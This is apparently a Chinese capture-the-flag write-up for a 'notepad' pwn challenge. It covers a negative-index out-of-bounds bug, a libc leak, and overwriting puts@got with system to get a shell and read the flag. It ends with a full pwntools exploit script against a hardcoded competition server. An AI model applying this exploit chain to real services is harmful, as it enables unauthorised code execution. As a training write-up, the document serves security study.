
## 解题过程

### 步骤 1 - 定位负数索引的越界范围

**关键观察**

由于 `get_note()` 函数仅限制了 `idx <= 9`，却缺失了对负数下界的校验，这使得输入负数下标能够让 notes 指针倒退至数组首地址之前。配合每个 note 占用 `0x30` 字节的特性，攻击者能通过传入不同的负数索引，精准访问位于 `.data`、`.bss` 或 `.got` 段周边的特定内存区域。

**关键命令**

```bash
checksec ./notepad
objdump -d -Mintel ./notepad | sed -n '/<get_note>:/,/^$/p'
objdump -R ./notepad
```

**关键输出**

```text
经查，notes 数组地址为 0x35a0，其前方分布着 stdin/stdout/stderr 的 copy relocation 以及 puts@got/printf@got/read@got 等关键数据结构。进一步分析可知，当 idx=-1 时能够泄露 stdin/stderr 的地址；当 idx=-5 时，恰好能将 content 的后半部分数据覆盖至 puts@got。
```

**补充说明**

这一特性构成了本题最基础的漏洞利用手段：即依靠同一种负数越界机制，同时实现了内存地址的泄露与关键指针的精准篡改。

### 步骤 2 - 泄露目标环境 libc 并排查附件版本差异

**关键观察**

在处理 `view(-1)` 的返回数据时，切忌直接使用首个换行符作为分隔标准，因为内存指针的字节序列中极易自带 `0x0a`。更为稳妥的方案是依赖 `Name` 与 `Content` 这两个提示字符串来进行截断，随后将获取到的 `FILE` 结构指针用零填充，转化为标准的 64 位地址。结合其它 GOT 表项的泄露结果进行交叉验证，可发现远程环境实际加载的 libc 库与题目附件中给定的 `libc.so.6` 存在版本偏差。

**关键命令**

```bash
name = out.split(b"Name: ", 1)[1].split(b"\nContent: ", 1)[0]
stdin_ptr = u64(name.ljust(8, b"\x00")[:8])
libc_base = stdin_ptr - 0x1ec980
```

**关键输出**

```text
目标服务器能够稳定返回 stdin 的指针信息，经过比对确认，远程实际生效的偏移量分别是 _IO_2_1_stdin_=0x1ec980 和 system=0x52290，这与附件中的 libc 偏移参数并不相符。
```

**补充说明**

倘若盲目沿用附件提供的 libc 数据，会导致整个漏洞利用链出现“逻辑无误但 system 函数地址解析偏离”的异常现象。

### 步骤 3 - 篡改 puts@got 为 system 并处理输入流同步问题

**关键观察**

在调用 `create(-5)` 期间，应当首先单独传输 idx 参数，接着必须等待程序输出 `Name` 及 `Content` 的提示符后，再依次发送 16 字节的 name 以及 32 字节的 content。如果一次性发送所有数据，scanf 会将后续的 payload 提前吞并至 stdio 的缓冲区中，进而造成 `read()` 无法截获完整的输入流。在执行覆盖操作时，只需将 name 和 content 的头部 16 字节均填充为 `sh\x00`，并把 system 的函数地址塞入 `content[16:24]` 的位置，便能成功将接下来的两次 puts 调用劫持至 system。

**关键命令**

```bash
io.sendline(b"1")
io.recvuntil(b"Index: ")
io.sendline(b"-5")
io.recvuntil(b"Name: ")
io.send((b"sh\\x00").ljust(16, b"A"))
io.recvuntil(b"Content: ")
io.send((b"sh\\x00").ljust(16, b"B") + p64(system_addr) + b"C" * 8)
```

**关键输出**

```text
当后续重新执行 view(-5) 时，程序原本触发的 puts(note) 与 puts(note+0x10) 指令均会被替换为 system("sh") 从而执行系统命令。
```

**补充说明**

考虑到远程靶机针对直接执行 `cat /flag` 进行了拦截过滤，仅放行了 `sh` 或 `/bin/sh` 指令，因此利用链的最终动作必须是先成功触发 `system("sh")` 才能继续深入。

### 步骤 4 - 获得 shell 权限后提取 flag

**关键观察**

当成功调用 `system("sh")` 拿到 shell 后，只需维持当前的通信连接，并向 shell 输入读取 flag 的命令即可完成利用。由于远程服务器在输出时会前置带有 `Name:` 的回显字符，我们在最终的证明记录里，仅提取并保留最核心的 flag 数据即可。

**关键命令**

```bash
python3 notepad_exp.py
```

**关键输出**

```text
Name: ISCC{87c822a8-9675-46e1-aa71-648bdbca1480}
[+] flag = ISCC{87c822a8-9675-46e1-aa71-648bdbca1480}
```

**补充说明**

完整的攻击脚本（EXP）已附在解答报告末尾，同时平台后端也会独立留存相应的可执行代码文件。

## 最终验证

采用经过确定的真实环境 libc 偏移量，并按照正确的提示符同步时序运行攻击脚本，成功诱发 `system("sh")` 执行并成功捕获 flag 字符串。

**关键命令**

```bash
python3 notepad_exp.py
```

**关键输出**

```text
Name: ISCC{87c822a8-9675-46e1-aa71-648bdbca1480}
[+] flag = ISCC{87c822a8-9675-46e1-aa71-648bdbca1480}
```

## 附录：EXP

```python
#!/usr/bin/env python3
from pwn import *
import re

context.log_level = "info"

HOST = "39.96.193.120"
PORT = 10005

# Remote deployment is not using the attached libc.so.6.
# These offsets match the live target during verification.
REMOTE_IO_STDIN = 0x1EC980
REMOTE_SYSTEM = 0x52290


def menu(io):
    io.recvuntil(b"> ")


def view(io, idx):
    io.sendline(b"2")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    return io.recvuntil(b"> ")


def create(io, idx, name, content):
    io.sendline(b"1")
    io.recvuntil(b"Index: ")
    io.sendline(str(idx).encode())
    io.recvuntil(b"Name: ")
    io.send(name.ljust(16, b"A"))
    io.recvuntil(b"Content: ")
    io.send(content.ljust(32, b"B"))
    io.recvuntil(b"> ")


def leak_libc_base(io):
    out = view(io, -1)
    name = out.split(b"Name: ", 1)[1].split(b"\nContent: ", 1)[0]
    stdin_ptr = u64(name.ljust(8, b"\x00")[:8])
    return stdin_ptr - REMOTE_IO_STDIN


def overwrite_puts_with_system(io, system_addr):
    name = b"sh\x00"
    content = b"sh\x00".ljust(16, b"B") + p64(system_addr) + b"C" * 8
    create(io, -5, name, content)


def get_flag():
    io = remote(HOST, PORT)
    menu(io)

    libc_base = leak_libc_base(io)
    log.info(f"libc base = {hex(libc_base)}")

    system_addr = libc_base + REMOTE_SYSTEM
    log.info(f"system = {hex(system_addr)}")

    overwrite_puts_with_system(io, system_addr)

    io.sendline(b"2")
    io.recvuntil(b"Index: ")
    io.sendline(b"-5")

    io.send(
        b"cat /flag* 2>/dev/null; "
        b"find / -name 'flag*' 2>/dev/null; "
        b"exit\n"
        b"exit\n"
    )

    data = io.recvuntil(b"}", timeout=5)
    io.close()

    text = data.decode("latin-1", errors="ignore")
    print(text)
    m = re.search(r"ISCC\{[^\r\n]+\}", text)
    if m:
        print(f"[+] flag = {m.group(0)}")
    else:
        print("[-] flag not found in output")


if __name__ == "__main__":
    get_flag()
```